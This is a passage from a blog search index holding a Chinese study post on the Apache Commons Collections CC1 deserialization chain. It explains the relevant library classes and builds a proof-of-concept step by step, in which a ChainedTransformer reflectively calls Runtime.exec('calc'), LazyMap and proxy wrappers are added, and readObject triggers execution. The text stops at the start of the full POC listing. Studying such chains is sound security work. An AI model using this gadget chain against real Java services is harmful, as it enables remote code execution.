<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CC链复现与思考</title>
    <link href="/2022/07/31/CC%E9%93%BE/"/>
    <url>/2022/07/31/CC%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="CC链复现与思考"><a href="#CC链复现与思考" class="headerlink" title="CC链复现与思考"></a>CC链复现与思考</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><blockquote><p>简介</p><p>Apache Commons 是对 JDK 的拓展，包含了很多开源的工具，用于解决平时编程经常会遇到的问题。Apache Commons 当中有一个组件叫做 Apache Commons Collections，封装了 Java 的 Collection 相关类对象</p></blockquote><p>关于这个组件的反序列化漏洞，需要了解其涉及的几个类。</p><h3 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h3><p>内部定义了一个transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> org.apache.commons.collections;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object var1)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ConstantTransformer类"><a href="#ConstantTransformer类" class="headerlink" title="ConstantTransformer类"></a>ConstantTransformer类</h3><p>Transformer接口的一个实现类。构造方法要求传入一个对象，保存在属性中，重写的transform方法会将此对象返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6374440726369055124L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">NULL_INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>((Object)<span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br><br>    ...<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<span class="hljs-comment">//构造方法传入一个对象</span><br>        <span class="hljs-built_in">this</span>.iConstant = constantToReturn;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<span class="hljs-comment">//重写的transform方法将对象返回</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.iConstant;<br>    &#125;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="InvokerTransformer类"><a href="#InvokerTransformer类" class="headerlink" title="InvokerTransformer类"></a>InvokerTransformer类</h3><p>Transformer接口的一个实现类，可以用来执行方法。构造方法要求传入反射获取Method的三个要素（方法名，参数类型，参数），重写的tranform方法要求传入一个对象，然后去调用之前传入的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>...<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>    <span class="hljs-built_in">this</span>.iMethodName = methodName;<span class="hljs-comment">//方法名</span><br>    <span class="hljs-built_in">this</span>.iParamTypes = paramTypes;<span class="hljs-comment">//参数格式</span><br>    <span class="hljs-built_in">this</span>.iArgs = args;<span class="hljs-comment">//参数</span><br>&#125;<br>....<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<span class="hljs-comment">//获取传入的对象的Class对象</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(<span class="hljs-built_in">this</span>.iMethodName, <span class="hljs-built_in">this</span>.iParamTypes);<span class="hljs-comment">//个通过方法名和参数格式反射出Method对象</span><br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-built_in">this</span>.iArgs);<span class="hljs-comment">//执行</span><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-built_in">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-built_in">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var7) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-built_in">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, var7);<br>        &#125;<br>    &#125;<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h3><p>Transformer接口的实现类。构造方法要求传入一个 Transformer[]，重写的transform方法会依次调用Transformer[]中的transform方法，并前一个Transformer的返回传入下一个的transform方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>...<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<span class="hljs-comment">//传入Transformer[]</span><br>        <span class="hljs-built_in">this</span>.iTransformers = transformers;<br>    &#125;<br>...<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.iTransformers.length; ++i) &#123;<span class="hljs-comment">//依次调用transform方法，并将前一个的返回传入到一下个的transform方法中</span><br>            object = <span class="hljs-built_in">this</span>.iTransformers[i].transform(object);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>....<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220727200739868.png" alt="image-20220727200739868"></p><h3 id="TransformedMap类"><a href="#TransformedMap类" class="headerlink" title="TransformedMap类"></a>TransformedMap类</h3><p>此类可以通过将Map设为一个属性值的方式来修饰一个Map，使Map在put时先去执行两个回调方法。</p><p>构造方法要求提供一个Map，两个Transformer分别对应key，value。</p><p>重写了put方法，方法中会先将key，value作为参数调用对应的Transformer的transform函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>...<br> <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>   &#125;<br>...<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>        key = <span class="hljs-built_in">this</span>.transformKey(key);<br>        value = <span class="hljs-built_in">this</span>.transformValue(value);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getMap().put(key, value);<br>    &#125;<br> ...<br> <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformKey</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.keyTransformer == <span class="hljs-literal">null</span> ? object : <span class="hljs-built_in">this</span>.keyTransformer.transform(object);<br>    &#125;<br><br> <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.valueTransformer == <span class="hljs-literal">null</span> ? object : <span class="hljs-built_in">this</span>.valueTransformer.transform(object);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>这个类类似于上面的TransformedMap，同样的可以修饰一个Map，只不过是在get时执行回调transform。</p><p>值得注意的是这个get方法会先判断传入的key是否在Map已经存在，如果不存在才会调用transform，并将返回可以key绑定再返回给get。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>, Serializable &#123;<br>    ...<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.factory = FactoryTransformer.getInstance(factory);<br>        &#125;<br>    &#125;<br>    ...<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">super</span>.map.containsKey(key)) &#123;<span class="hljs-comment">//注意此处会判断key是否找得到对应得value,若有则不去调用回调</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.factory.transform(key);<br>            <span class="hljs-built_in">super</span>.map.put(key, value);<span class="hljs-comment">//将trasform的返回与key绑定</span><br>            <span class="hljs-keyword">return</span> value;<span class="hljs-comment">//再返回value</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.map.get(key);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><blockquote><p>版本</p><p>Commons-Collections 3.1-3.2.1</p><p>jdk1.8u71之前</p></blockquote><p>先来了解一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    ...<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.getName();<br>        Class[] var5 = var2.getParameterTypes();<br>        <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">assert</span> var5.length == <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toStringImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hashCodeImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;annotationType&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.get(var4);<span class="hljs-comment">//这里是关键，使用get方法。如果将menberValues设置成一个精心构造的LazyMap就可以触发RCE。</span><br>                <span class="hljs-keyword">if</span> (var6 == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(<span class="hljs-built_in">this</span>.type, var4);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var6 <span class="hljs-keyword">instanceof</span> ExceptionProxy) &#123;<br>                    <span class="hljs-keyword">throw</span> ((ExceptionProxy)var6).generateException();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="hljs-number">0</span>) &#123;<br>                        var6 = <span class="hljs-built_in">this</span>.cloneArray(var6);<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> var6;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类最关键的一点是实现了一个 InvocationHandler 接口。这个接口是Java动态代理的核心。关于动态代理之后再专门详细学习。在这里只需要知道，使用这个<code>AnnotationInvocationHandler</code>作为 Handler构造的动态代理类，调用<strong>接口实现方法</strong>都会去执行<code>AnnotationInvocationHandler.invok</code>方法。</p><h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>首先将可以执行命令的transformer构造出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)),<span class="hljs-comment">//获取Runtime类对象</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<span class="hljs-comment">//反射获取单例模式的getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<span class="hljs-comment">//执行getRuntime方法，获取Runtime对象，由于是静态方法，对象参数直接传入null就行。</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<span class="hljs-comment">//直接调用Runtime.exec方法执行命令</span><br>        &#125;);<br></code></pre></td></tr></table></figure><p>再建立一个LazyMap使用构造的transformer修饰。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">LazyMap</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(inner,transformer);<br></code></pre></td></tr></table></figure><p>现在这个链的一半完成了，接下来的一半就是想办法去调用这个LazyMap的get方法。</p><p>上面的介绍<code>AnnotationInvocationHandler</code>类里的<code>invoke</code>方法里就会调用其内部属性<code>memberValues</code>的get方法。所以先将构造一个包含了恶意LazyMap的 <code>AnnotationInvocationHandler</code>对象。需要注意的是这对象是JDK内部对象，需要使用反射才能获取到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clzz</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span>  <span class="hljs-operator">=</span> clzz.getDeclaredConstructor(Class.class,Map.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">Handler</span> <span class="hljs-operator">=</span>(InvocationHandler) constructor.newInstance(Retention.class,outer);<br></code></pre></td></tr></table></figure><p>但是，反序列化漏洞的入口一定是readObject方法，那么要怎样从readObject方法去到invoke方法呢？</p><p>这里使用的就是上面的动态代理方法来实现的，使用构造好的<code>AnnotationInvocationHandler</code>对象去代理一个Map，这个Map调用<strong>接口实现方法</strong>都会去执行<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法。</p><blockquote><p>这就是生成的代理对象的一部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&gt;<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">$Proxy0</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span> &#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method m14;<br>&gt;...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Set <span class="hljs-title function_">entrySet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  &#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">return</span> (Set)<span class="hljs-built_in">super</span>.h.invoke(<span class="hljs-built_in">this</span>, m14, (Object[])<span class="hljs-literal">null</span>);<span class="hljs-comment">//这里的h就是上面构造的AnnotationInvocationHandler，就调用它的invoke方法。</span><br>       &#125; <span class="hljs-keyword">catch</span> (RuntimeException | Error var2) &#123;<br>           <span class="hljs-keyword">throw</span> var2;<br>       &#125; <span class="hljs-keyword">catch</span> (Throwable var3) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndeclaredThrowableException</span>(var3);<br>       &#125;<br>   &#125;<br>...<br>&gt;&#125;<br></code></pre></td></tr></table></figure></blockquote><p>所以先用<code>AnnotationInvocationHandler</code>去代理一个Map对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">myMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(HashMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,Handler);<br></code></pre></td></tr></table></figure><p>那么怎么去调用这个Map中的接口方法呢，刚好<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法中会调用到<code>entrySet</code>方法</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&gt;<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       var1.defaultReadObject();<br>       <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           var2 = AnnotationType.getInstance(<span class="hljs-built_in">this</span>.type);<br>       &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>       &#125;<br><br>       <span class="hljs-type">Map</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.memberTypes();<br>       <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.entrySet().iterator();<span class="hljs-comment">//此处就会触发动态代理的invoke方法整个利用链成功串联。</span><br><br>       <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>           Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> (Map.Entry)var4.next();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (String)var5.getKey();<br>           <span class="hljs-type">Class</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> (Class)var3.get(var6);<br>           <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var5.getValue();<br>               <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                   var5.setValue((<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>               &#125;<br>           &#125;<br>       &#125;<br><br>   &#125;<br></code></pre></td></tr></table></figure></blockquote><p>所以再将代理对象封装进一个新的 <code>AnnotationInvocationHandler</code>对象里面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">serHandler</span> <span class="hljs-operator">=</span>(InvocationHandler) constructor.newInstance(Retention.class,myMap);<br></code></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 